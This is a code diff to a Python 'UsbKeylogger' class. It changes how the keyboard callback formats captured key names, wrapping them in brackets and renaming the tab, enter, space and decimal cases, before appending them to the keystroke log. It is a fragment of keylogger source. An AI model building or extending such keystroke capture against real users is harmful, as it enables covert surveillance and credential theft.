@@ -49,16 +49,16 @@ class UsbKeylogger:
     #def reportText(self):
 
     def callbackKeyboard(self, event):
-        eventName = event.name # Create eventName variable
+        eventName = "[" + event.name + "]"# Create eventName variable
         nameLength = len(eventName) # Returns the length of the eventName variable
         if nameLength > 1: # Conditional statement to format the appearence of the keylogs in event that they key is not a typical character like a letter or number. 
-            if eventName == "tab":
-                eventName = "[TAB]\t" # Replaces [TAB] with [TAB] and a tab space afterward    
-            elif eventName == "enter":
-                eventName = "[ENTER]\n" # Replaces [ENTER] with [ENTER] and a creates a new line afterward              
-            elif eventName == "space":
+            if eventName == "[tab]":
+                eventName = "[tab]\t" # Replaces [TAB] with [TAB] and a tab space afterward    
+            elif eventName == "[enter]":
+                eventName = "[enter]\n" # Replaces [ENTER] with [ENTER] and a creates a new line afterward              
+            elif eventName == "[space]":
                 eventName = " " # Replaces [SPACE] with " " for readability
-            elif eventName == "decimal":
+            elif eventName == "[decimal]":
                 eventName = "." # Replaces [DECIMAL] with "." for readability
         self.keylog = self.keylog + eventName # Updates the self.keylog variable with the eventName
 
